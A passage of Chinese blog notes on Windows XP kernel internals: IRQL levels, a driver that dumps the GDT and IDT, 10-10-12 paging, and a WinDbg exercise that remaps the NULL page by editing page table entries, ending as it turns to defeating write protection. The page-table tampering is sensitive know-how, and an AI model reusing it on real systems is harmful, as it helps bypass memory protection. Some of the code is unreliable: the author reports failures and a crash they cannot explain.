<tr>
<td>复制</td>
<td>RtlCopyString</td>
<td>RtlCopyUnicodeString</td>
</tr>
<tr>
<td>比较</td>
<td>RtlCompareString</td>
<td>RtlCompareUnicoodeString</td>
</tr>
<tr>
<td>转换</td>
<td>RtlAnsiStringToUnicodeString</td>
<td>RtlUnicodeStringToAnsiString</td>
</tr>
</tbody></table>
<p>具体函数使用可参考：<a href="https://www.cnblogs.com/qintangtao/archive/2013/04/15/3023092.html">内核模式下的字符串操作</a></p>
<h3 id="4-9-中断请求级别IRQL"><a href="#4-9-中断请求级别IRQL" class="headerlink" title="4.9 中断请求级别IRQL"></a>4.9 中断请求级别IRQL</h3><p>尽管APIC（高级可编程中断控制器）中断控制器已经提供了中断优先级支持，不过，Windows自己还是定义了一套优先级方案，称为<strong>中断请求级别</strong>（IRQL，Interrupt Request Level）。在Intel x86系统中，Windows使用0~31来表示优先级，数值越大，优先级越高。</p>
<div class="note warning"><ol>
<li>Windowst运行在一个高并发的环境当中，<strong>任一时刻，每一个处理器，都运行在某个IRQL之上</strong>。</li>
<li>每个处理器的IRQL决定了它如何处理中断，以及允许接收哪些中断。<strong>优先级低的可以被优先级高的打断</strong>。</li>
<li>IRQL也被用于实现对一些内核模式数据结构的同步访问。例如，与线程调度相关的数据结构只有在<code>DISPATCH_LEVEL</code>上才可以访问。</li>
</ol>
</div>

<p>优先级如下图：</p>
<p><img data-src="https://s2.loli.net/2022/01/14/WSU957rkQIbi3wP.png" alt="4.png"></p>
<div class="note primary"><ol>
<li><mark class="label success">0，PASSIVE_LEVEL</mark>：<code>PASSIVE_LEVEL</code>（被动级别）代表了<strong>最低的IRQL</strong>，运行在<code>PASSIVE_LEVEL</code>的线程可以被任何高IRQL的事情打断，<strong>所有的用户模式代码都运行在此IRQL上</strong>。</li>
<li><mark class="label warning">1，APC_LEVEL</mark>：<code>APC_LEVEL</code>（APC级别）仅仅比<code>PASSIVE_LEVEL</code>高，这也正是在一个线程中插入一个APC可以打断该线程（如果它正在<code>PASSIVE_LEVEL</code>上）运行的原因。</li>
<li><mark class="label default">2，DISPATCH_LEVEL</mark>：该级别是一个重要的区分点，它代表了<strong>线程调度器正在运行</strong>。一个处理器运行在此IRQL上，说明它正在分配处理器的计算资源，有可能正在做两件事情之一：<ul>
<li>正在进行线程调度，比如选择新的线程。</li>
<li>正在处理一个硬件中断的后半部分（不那么紧急的部分），在Windows中，这被称为<strong>DPC</strong>（Deferred Procedure Call），DPC与线程无关。</li>
</ul>
</li>
<li><mark class="label info">3~26，设备IRQL（DIRQL）</mark>：3~26之间的RQL被分配给设备，称为<strong>设备IRQL</strong>（或<strong>DIRQL</strong>），HAL规定它们的分配方案。例如，在Intel x86多处理器系统中，HAL会循环地将中断向量号映射到这段IRQL范围中。从IRQL的角度而言，<strong>DIRQL范围中的IRQL并无优先级区别，不同的设备中断只是被映射到相同或不同的IRQL而已</strong>。</li>
</ol>
</div>

<p>关于APC_LEVEL：</p>
<p>在这个级别上，只有APC级别的中断被屏蔽，<strong>可以访问分页内存</strong>。当有APC发生时，处理器提升到APC级别，这样就屏蔽掉其它APC，为了和APC执行一些同步，驱动程序可以手动提升到这个级别。比如，如果提升到这个级别，APC就不能调用。在这个级别，APC被禁止了，导致禁止一些I0完成APC，所以有一些API不能调用。</p>
<p><strong>⚠️关于DISPATCH_LEVEL需要特别注意：</strong></p>
<ol>
<li><code>DISPATCH_LEVEL</code>是最高的软件中断IRQL，它低于所有硬件中断的IRQL。</li>
<li>运行在<code>DISPATCH_LEVEL</code>上的线程，<strong>不会被其他的线程抢占，只有可能被更高级别的中断抢占</strong>。</li>
<li>在<code>DISPATCH_LEVEL</code>或更高的IRQL上，<strong>不能访问换页内存区</strong>，因为一旦发生换页动作，就需要执行操作，从磁盘上读入页面，期间至少有一个等待动作。</li>
<li>除了系统调度器以外的其他内核代码，一旦运行在这个级别或更高的I迟IRQL上，则不得切换到其他线程（比如，等待一个同步对象），因为线程切换是通过系统调度器来完成的，而系统调度器运行在<code>DISPATCH_LEVEL</code>上。</li>
</ol>
<h3 id="4-a-练习1：读取GDT、IDT"><a href="#4-a-练习1：读取GDT、IDT" class="headerlink" title="4.a 练习1：读取GDT、IDT"></a>4.a 练习1：读取GDT、IDT</h3><p><strong>申请一块内存，并在内存中存储GDT、IDT的所有数据。然后在Debugview中显示出来，最后释放内存。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  UCHAR GDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UCHAR IDT[<span class="number">6</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ULONG GDTAddr = <span class="number">0</span>; ULONG IDTAddr = <span class="number">0</span>;</span><br><span class="line">  USHORT GDTLen = <span class="number">0</span>; USHORT IDTLen = <span class="number">0</span>;</span><br><span class="line">  PUCHAR pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">  USHORT i = <span class="number">0</span>;</span><br><span class="line">  DbgPrint(<span class="string">&quot;主函数开始运行...\r\n&quot;</span>);</span><br><span class="line">	<span class="comment">// 读取GDT、IDT寄存器的值</span></span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		sgdt fword ptr ds:[GDT];</span><br><span class="line">		sidt fword ptr ds:[IDT];</span><br><span class="line">	&#125;</span><br><span class="line">  GDTLen = *(PUSHORT)GDT;</span><br><span class="line">  IDTLen = *(PUSHORT)IDT;</span><br><span class="line">  GDTAddr = *(PULONG)(GDT+<span class="number">2</span>);</span><br><span class="line">  IDTAddr = *(PULONG)(IDT+<span class="number">2</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  PVOID </span></span><br><span class="line"><span class="comment">  ExAllocatePoolWithTag(</span></span><br><span class="line"><span class="comment">    IN POOL_TYPE  PoolType,</span></span><br><span class="line"><span class="comment">    IN SIZE_T  NumberOfBytes,</span></span><br><span class="line"><span class="comment">    IN ULONG  Tag</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">//VirtualAlloc</span></span><br><span class="line">  pBuffer = (PUCHAR)ExAllocatePoolWithTag(PagedPool,GDTLen + IDTLen,<span class="number">20220114</span>);</span><br><span class="line">  <span class="keyword">if</span>(!pBuffer)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;内存申请失败！\n&quot;</span>);</span><br><span class="line">    driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//memset</span></span><br><span class="line">  RtlFillMemory(pBuffer,GDTLen + IDTLen,<span class="number">0x0</span>);</span><br><span class="line">  <span class="comment">//memcpy</span></span><br><span class="line">  RtlMoveMemory(pBuffer,(PUCHAR)GDTAddr,GDTLen);</span><br><span class="line">  RtlMoveMemory(pBuffer+GDTLen,(PUCHAR)IDTAddr,IDTLen);</span><br><span class="line">  </span><br><span class="line">  DbgPrint(<span class="string">&quot;打印GDT\r\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; GDTLen;i+=<span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;%08X %08X`%08X %08X`%08X\r\n&quot;</span>,GDTAddr+i,((PULONG)pBuffer+i)[<span class="number">1</span>],((PULONG)pBuffer+i)[<span class="number">0</span>],((PULONG)pBuffer+i)[<span class="number">3</span>],((PULONG)pBuffer+i)[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DbgPrint(<span class="string">&quot;打印IDT\r\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//pBuffer = pBuffer + GDTLen;	//这行执行会蓝屏，不知道为什么</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; IDTLen;i+=<span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;%08X %08X`%08X %08X`%08X\r\n&quot;</span>,IDTAddr+i,((PULONG)(pBuffer+GDTLen)+i)[<span class="number">1</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">0</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">3</span>],((PULONG)(pBuffer+GDTLen)+i)[<span class="number">2</span>]);</span><br><span class="line">  &#125;	</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//释放内存</span></span><br><span class="line">  ExFreePool(pBuffer);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">  driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2022/01/14/DJdGjS2IHmsBVLE.png" alt="5.png"></p>
<h3 id="4-b-练习2：处理字符串"><a href="#4-b-练习2：处理字符串" class="headerlink" title="4.b 练习2：处理字符串"></a>4.b 练习2：处理字符串</h3><p>&lt;1&gt; 初始化一个字符串</p>
<p>&lt;2&gt; 拷贝一个字符串</p>
<p>&lt;3&gt; 比较两个字符串是否相等</p>
<p>&lt;4&gt; ANSI_STRING与UNICODE_STRING字符串相互转换</p>
<p>结果：拷贝函数<code>RtlCopyString</code>无法成功执行拷贝，不知道为啥。</p>
<div class="note success"><p>⚠️注意：<strong>要是用变量的话需要在函数开头就进行定义，最好进行声明，不能是用变量的时候才进行定义，否则会失败</strong>。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了.\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  STRING StrSour = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  STRING StrDest = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UNICODE_STRING UnicodeStr = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  UNICODE_STRING UnicodeStrDest = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  LONG lRet = <span class="number">0</span>;</span><br><span class="line">  NTSTATUS NtRet;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化一个ANSI字符串</span></span><br><span class="line">  RtlInitAnsiString(&amp;StrSour,<span class="string">&quot;This is ANSI String!&quot;</span>);</span><br><span class="line">  DbgPrint(<span class="string">&quot;StrSour内容为：%s,长度为：%d，最大长度为：%d\n&quot;</span>,StrSour.Buffer,StrSour.Length,StrSour.MaximumLength);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//字符串拷贝</span></span><br><span class="line">  RtlCopyString(&amp;StrDest,&amp;StrSour);</span><br><span class="line">  DbgPrint(<span class="string">&quot;StrDest内容为：%s,长度为：%d，最大长度为：%d\n&quot;</span>,StrDest.Buffer,StrDest.Length,StrDest.MaximumLength);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">//比较两个字符串</span></span><br><span class="line">  lRet = RtlCompareString(&amp;StrDest,&amp;StrSour,TRUE);	<span class="comment">//TRUE:区分大小写</span></span><br><span class="line">  <span class="keyword">if</span>(lRet == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;两个字符串一样！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(lRet &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;第一个字符串大于第二个字符串！\n&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;第二个字符串大于第二个字符串！\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//ANSI_STRING与UNICODE_STRING字符串相互转换</span></span><br><span class="line">  NtRet = RtlAnsiStringToUnicodeString(&amp;UnicodeStr,&amp;StrSour,TRUE);<span class="comment">//TRUE:是否需要对被转换的字符串分配内存</span></span><br><span class="line">  DbgPrint(<span class="string">&quot;转换返回值：0x%X\n&quot;</span>,NtRet);</span><br><span class="line">  <span class="keyword">if</span>(NtRet == STATUS_SUCCESS)</span><br><span class="line">  &#123;</span><br><span class="line">	  DbgPrint(<span class="string">&quot;转换后内容为：%ws,长度为：%d，最大长度为：%d\n&quot;</span>,UnicodeStr.Buffer,UnicodeStr.Length,UnicodeStr.MaximumLength);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//字符串拷贝</span></span><br><span class="line">  RtlCopyUnicodeString(&amp;UnicodeStrDest,&amp;UnicodeStr);</span><br><span class="line">  DbgPrint(<span class="string">&quot;转换后内容为：%ws,长度为：%d，最大长度为：%d\n&quot;</span>,UnicodeStrDest.Buffer,UnicodeStrDest.Length,UnicodeStrDest.MaximumLength);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">  driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">  <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img data-src="https://s2.loli.net/2022/01/15/ChkBHEgrOJRMcZa.png" alt="6.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>WinXP驱动</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>WinXP内核</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows XP 页保护（一）</title>
    <url>/post/WinXP-ProtectionMode-Page/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<h2 id="1-CR3和物理内存"><a href="#1-CR3和物理内存" class="headerlink" title="1 CR3和物理内存"></a>1 CR3和物理内存</h2><p>如下指令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov eax,dword ptr ds:[<span class="number">0x12345678</span>]</span><br></pre></td></tr></table></figure>

<div class="note warning"><p>有效地址：0x12345678</p>
<p>线性地址：ds.Base + 0x12345678</p>
<p>物理地址：通过线性地址进行转换得到</p>
</div>

<p>存在内存的DLL会个每个EXE映射一个线性地址，要想通过线性地址找到真正的物理地址，就必须借助于<mark class="label danger">CR3</mark>寄存器。该寄存器存的值是物理地址，<strong>每个进程一个CR3的值，不是一个线程一个CR3的值</strong>。</p>
<p>物理内存的单位：页&#x2F;4KB。</p>
<p>如下， CR3指向一个物理页，一共4096字节：</p>
<p><img data-src="https://s2.loli.net/2021/12/26/b8LFQa7XeZikyPv.png" alt="1.png"></p>
<ul>
<li>第一级：叫做<mark class="label primary">页目录表</mark>，大小1页&#x2F;4KB&#x2F;4096字节&#x2F;1024项。</li>
<li>第二级：叫做<mark class="label warning">页表</mark>，大小1页&#x2F;4KB&#x2F;4096字节&#x2F;1024项。</li>
<li>第三级：真正的<mark class="label default">物理页</mark>内存。</li>
</ul>
<h2 id="2-10-10-12分页模式"><a href="#2-10-10-12分页模式" class="headerlink" title="2 10-10-12分页模式"></a>2 10-10-12分页模式</h2><p>X86模式下存在<mark class="label danger">10-10-12</mark>分页和<mark class="label danger">2-9-9-12</mark>分页来将线性地址转换为物理地址。</p>
<p>10-10-12分页转换规则如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/26/bXnhT8QL7V6NkoD.png" alt="2.png"></p>
<p>转换步骤（0x000AAA40）：</p>
<ol>
<li>修改Windows XP启动配置，将<code>noexecute</code>改成<code>execute</code>，使用10-10-12分页模式。</li>
<li>将线性地址做10-10-12排列：<ul>
<li>10：对应<strong>第一级目录</strong>，0000 0000 00 &#x3D; 0x0</li>
<li>10：对应<strong>第二级页表</strong>，00 1010 1010 &#x3D; 0xAA</li>
<li>12：对应<strong>第三级物理页</strong>，1010 0100 0000 &#x3D; 0xA40</li>
</ul>
</li>
<li>将高地址的两段左移4位（第一和第二张表存的是地址，大小是4字节，所以要乘4）：<ul>
<li>0x0*4 &#x3D; 0x0 </li>
<li>0xAA*4 &#x3D; 0x2A8</li>
</ul>
</li>
<li>根据CR3寄存器的值进行查表，CR3是一个<mark class="label warning">基址</mark>，$Dir&#x3D;CR3+Offset_1*4$，指向第一级目录。</li>
<li>将步骤3得到的地址低12位（属性）置0，然后 PageTable &#x3D; (Dir &amp; 0xFFFFF000) + Offset_2  * 4，指向第二级的页表。</li>
<li>将步骤4得到的地址低12位（属性）置0，然后 Address &#x3D; (PageTable &amp; 0xFFFFF000) + Offset_3 ，即为物理地址。</li>
</ol>
<div class="note default"><p>实际上，把PDT、PTT表堪称两个 <code>DWORD</code> 数组：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD PDT[Num_PDT];</span><br><span class="line">DWORD PTT[Num_PTT];	</span><br><span class="line"><span class="number">1</span>、每一项 PDT[x] 对应一张PTT表，也就是对应一个 PTT[Num_PTT] 数组</span><br><span class="line"><span class="number">2</span>、数组 PDT[Num_PDT] 起始地址为 CR3，<span class="number">32</span>位线性地址的的高<span class="number">10</span>位为数组索引，计算第x项PDE的地址为：CR3+((VirtualAddress&gt;&gt;<span class="number">22</span>)&amp;<span class="number">0x3FF</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure>


</div>

<h2 id="3-练习：查找字符串的物理地址"><a href="#3-练习：查找字符串的物理地址" class="headerlink" title="3 练习：查找字符串的物理地址"></a>3 练习：查找字符串的物理地址</h2><p>题目：打开Notepad.exe输入字符串并查找其对应的物理地址。</p>
<ol>
<li><p>修改Windows XP启动配置，将<code>noexecute</code>改成<code>execute</code>，使用10-10-12分页模式。</p>
</li>
<li><p>CE查看字符串虚拟地址：0x000AAFF8</p>
<p><img data-src="https://s2.loli.net/2021/12/27/QxSmoW6dVAR5jsl.png" alt="3.png"></p>
</li>
<li><p>按10-10-12分页拆分偏移地址：</p>
<ul>
<li>10：0x0*4 &#x3D; 0x0</li>
<li>10：AA*4 &#x3D; 0x2A8</li>
<li>12：0xFF8</li>
</ul>
</li>
<li><p>在Windbg中使用<code>!process 0 0</code>获取当前进程CR3的值：0x15dd4000（物理地址）</p>
<p><img data-src="https://s2.loli.net/2021/12/27/6T1k7wltnp5qgaA.png" alt="4.png"></p>
</li>
<li><p>获取在第一级目录中的值<code>!dd 0x15dd4000+0x0</code>：$Dir&#x3D;CR3+Offset_1*4$ &#x3D; 0x15be1867。</p>
<p><img data-src="https://s2.loli.net/2021/12/27/UrMImVvWu6JT5Gz.png" alt="5.png"></p>
</li>
<li><p>将第一级目录低12位（属性）置0后查偏移，PageTable &#x3D;  (Dir &amp; 0xFFFFF000) + Offset_2  * 4 ，<code>!dd 0x15be1000+0x2A8</code> &#x3D; 0x1609b86。</p>
<p><img data-src="https://s2.loli.net/2021/12/28/odlgAf2OX5B6xqv.png" alt="6.png"></p>
</li>
<li><p>将页表查到的值低12位（属性）置0后查偏移，Address &#x3D; (PageTable &amp; 0xFFFFF000) + Offset_3 ，<code>!db 0x1609b000 + 0xFF8</code> 。</p>
<p><img data-src="https://s2.loli.net/2021/12/28/bsN7o3JtkAmXngT.png" alt="7.png"></p>
</li>
</ol>
<h2 id="4-PDT、PTT表"><a href="#4-PDT、PTT表" class="headerlink" title="4 PDT、PTT表"></a>4 PDT、PTT表</h2><p><img data-src="https://s2.loli.net/2021/12/29/VfSq3JOaevQAwGb.png" alt="8.png"></p>
<p>CR3是唯一一个存储物理地址的寄存器，为第一级页目录表的基址。</p>
<ul>
<li><strong>第一级</strong>：PDT表，<strong>页目录表</strong>，总共1页（4KB&#x3D;4096字节、1000h），每个成员占4字节，每个成员&#x2F;每一项称为<mark class="label success">PDE</mark>，共1024项</li>
<li><strong>第二级</strong>：PTT表，<strong>页表</strong>，总共1页，每一项称为<mark class="label success">PTE</mark>（4字节），共1024项</li>
<li><strong>第三级</strong>：物理页，一个页的大小是4KB，在<strong>同一个物理页地址属性是相同的。</strong></li>
</ul>
<p>10-10-12分页原理：第一级和第二级共1024项，可以使用10位来表示。物理页大小为4KB&#x3D;2^ 12，共需要12位来表示。</p>
<p>10-10-12内存寻址大小：<mark class="label warning">1024*1024*4096=4GB</mark>（当前CPU能识别的物理内存大小）</p>
<div class="note default"><p>PDE和PTE的特征：</p>
<ol>
<li>PTE可以为空（内存还未分配）</li>
<li>多个PTE可以指向同一个物理页</li>
<li>一个PTE仅指向一个物理页</li>
<li>同一个进程中（一个CR3）两个线性地址只要高20位相同，则指向的<strong>物理页相同，只是页内偏移不同</strong></li>
</ol>
</div>

<h2 id="5-练习：挂靠物理页读写NULL地址"><a href="#5-练习：挂靠物理页读写NULL地址" class="headerlink" title="5 练习：挂靠物理页读写NULL地址"></a>5 练习：挂靠物理页读写NULL地址</h2><p>编程中，不能读写NULL，否则会报<code>0xC0000005</code>错误，原因是NULL指针地址的PTE没有对应的物理页，因此，只要我们让NULL指针最终映射到一块可读写的物理页，就可以用NULL去读写数据了。</p>
<p><strong>注意：</strong>如果NULL的PDE项不为0，则直接修改NULL的PTE即可。</p>
<p>只需要将线性地址<code>0x00000000</code>的PTE挂载到变量x对应的物理页上，这样就可以读写了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> x = <span class="number">0x1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;变量x的线性地址为：%X\n&quot;</span>,&amp;x);</span><br><span class="line">  getchar();	<span class="comment">//在Windbg中获取CR3的值并获取线性地址x的PTE和NULL的PTE</span></span><br><span class="line">  </span><br><span class="line">  *(<span class="keyword">int</span>*)<span class="literal">NULL</span> = <span class="number">0x123</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;NULL地址的值为：%X\n&quot;</span>,*(<span class="keyword">int</span>*)<span class="literal">NULL</span>);</span><br><span class="line">  getchar();</span><br><span class="line">  system(<span class="string">&quot;Pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在XP中运行代码如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Jum5B6QLRcYlqvh.png" alt="9.png"></p>
</li>
<li><p>在Windbg中获取当前当前进程CR3的值并找到变量x的PDE、PTE、物理页地址。</p>
<ol>
<li><p>按10-10-12拆分0x0012FF7C：</p>
<ul>
<li>10：0000 0000 00 &#x3D; 0x0 * 4 &#x3D; 0x0；</li>
<li>10：01 0010 1111 &#x3D; 0x12F * 4 &#x3D; 0x4BC；</li>
<li>12：0xF7C。</li>
</ul>
</li>
<li><p>使用<code>!process 0 0</code>获取CR3的值：0x216e8000。</p>
</li>
<li><p><code>!dd 0x216e8000+0x0</code>获取变量x的PDE：PDEx &#x3D; 0x21971867，PTEx &#x3D; 0x21C86867。</p>
</li>
<li><p><code>!dd 0x21971000+0x4BC</code>获取变量x的PTE：PTEx &#x3D; 0x21C86000（去属性），物理地址 &#x3D; 0x21c86F7C。</p>
</li>
<li><p><code>!dd 0x21c86000+0xF7C</code>获取变量x的值：0x1。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Zk3GElOq5DYBJes.png" alt="10.png"></p>
</li>
</ol>
</li>
<li><p>按10-10-12拆分0x00000000，全是0。</p>
<ol>
<li><p><code>!dd 0x216e8000+0x0</code>获取NULL地址的PTE：PDE0 &#x3D; 0x21971867。</p>
</li>
<li><p><code>!dd 0x21971000+0x0</code>获取NULL的物理地址：PTE0 &#x3D; 0x0。</p>
<p><img data-src="https://s2.loli.net/2021/12/29/Tc5VkRhidu62mtb.png" alt="11.png"></p>
</li>
</ol>
</li>
<li><p>可以得出：PTEx &#x3D;  0x21C86867，PTE0 &#x3D; 0x0。则将变量x的PTE赋值给NULL的PTE即可，NULL的PDE去属性为：0x21971000，执行<code>!ed 0x21971000 0x21C86867</code>即可。流程如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/Kze9FUY3tPV1jr6.png" alt="12.png"></p>
</li>
<li><p>回到XP中继续执行代码如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/30/RKvsU42ZWpIGgk1.png" alt="13.png"></p>
</li>
</ol>
<div class="note success"><p><strong>结论：</strong></p>
<p>现在x和NULL的PTE值相同，NULL和x处于同一个物理页，物理页地址范围 0x21C86000～0x21C86FFF，但是二者物理地址仍然是不同的，因为x在物理页内的偏移是 0xF7C，而NULL的偏移是0。</p>
<p>但是没有关系，NULL已经指向了一块可用的物理页了，现在可以对NULL进行读写了。</p>
</div>

<h2 id="6-PDE、PTE属性"><a href="#6-PDE、PTE属性" class="headerlink" title="6 PDE、PTE属性"></a>6 PDE、PTE属性</h2><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"> </p>
<p><img data-src="https://s2.loli.net/2021/12/30/ObrX7mJCiTyBIcY.png" alt="15.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/30/74qTRyDSm152OUY.png" alt="16.png"></p>
<p>PDE和PTE的低12位表示物理页的属性。</p>
<mark class="label danger">物理页的属性 = PDE属性 & PTE属性</mark>（除了G位和2-9-9-12的最高XD位，为OR，）

<h3 id="6-1-P位-0"><a href="#6-1-P位-0" class="headerlink" title="6.1 P位[0]"></a>6.1 P位[0]</h3><p>P位（Present）是存在位标志，该标志表明，该表项所指向的页或者页表当前是否在内存中。</p>
<div class="note primary"><ul>
<li>P &#x3D; 1，这个页<strong>在物理内存中</strong>，将执行地址转换。</li>
<li>P &#x3D; 0，表示这个页<strong>不在物理内存中</strong>，如果处理器试图访问该页，将产生一个缺页异常（PF），<code>INT E</code>异常。</li>
</ul>
</div>

<p>处理器并不置位或者清零该位；而是由操作系统来维护该标志的状态。</p>
<p>当P &#x3D; 0时将会触发<code>int e</code>缺页异常，接着操作系统会再去检查PDE和PTE的属性来决定采用以下4种换页方式中的哪一种：</p>
<p>如果处理器产生一个缺页异常，操作系统必须按序执行如下操作：</p>
<ol>
<li>如果有必要，将该页从磁盘拷贝到内存中。</li>
<li>将该页地址装载入页表或者页目录项并设置它的存在标志。其他的位，比如脏<br>位（D位）和访问位，也必须同时被设置。</li>
<li>使TLB中的当前页表项失效。</li>
<li>从缺页异常处理程序返回，重新执行被中断的进程或任务。</li>
</ol>
<h3 id="6-2-R-x2F-W位-1"><a href="#6-2-R-x2F-W位-1" class="headerlink" title="6.2 R&#x2F;W位[1]"></a>6.2 R&#x2F;W位[1]</h3><p><img data-src="https://s2.loli.net/2021/12/30/G3TKJmn6heCHOXQ.png" alt="14.png"></p>
<p>R&#x2F;W位（Read&#x2F;Write）读写标志。</p>
<div class="note info"><ul>
<li>R&#x2F;W &#x3D; 1，该页内存<strong>可读可写</strong>。</li>
<li>R&#x2F;W &#x3D; 0，该页内存<strong>只读</strong>。</li>
</ul>
</div>

<p><strong>只有当PDE和PTE的R&#x2F;W位都为1的时候，该物理页才是可读可写的。</strong>R&#x2F;W标志与U&#x2F;S标志和CR0寄存器中的WP标志共同起作用。</p>
<h4 id="6-2-1-练习：修改常量区数据"><a href="#6-2-1-练习：修改常量区数据" class="headerlink" title="6.2.1 练习：修改常量区数据"></a>6.2.1 练习：修改常量区数据</h4><p>C语言中，修改常量区的字符串是不允许的，原因是物理页不具有写权限。</p>
<p>只需要将常量区的线性地址转换后的物理地址的<code>PDE_R/W &amp; PTE_R/W = 1</code>即可。</p>
<p>如下代码：</p>
